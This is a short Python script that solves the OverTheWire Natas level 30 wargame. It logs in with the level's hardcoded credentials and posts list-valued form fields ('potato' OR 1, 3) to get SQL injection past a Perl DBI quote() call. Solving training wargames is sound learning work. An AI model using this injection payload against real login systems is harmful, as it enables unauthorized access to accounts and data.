#!/bin/python

import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"
user = "natas30"
pwd = "wie9iexae0Daihohv8vuu3cei9wahf0e"

data = {"username" : ["'potato' OR 1", 3], "password" : ["'potato' OR 1", 3] }

r = requests.post(url, auth=(user,pwd), data=data)
print r.content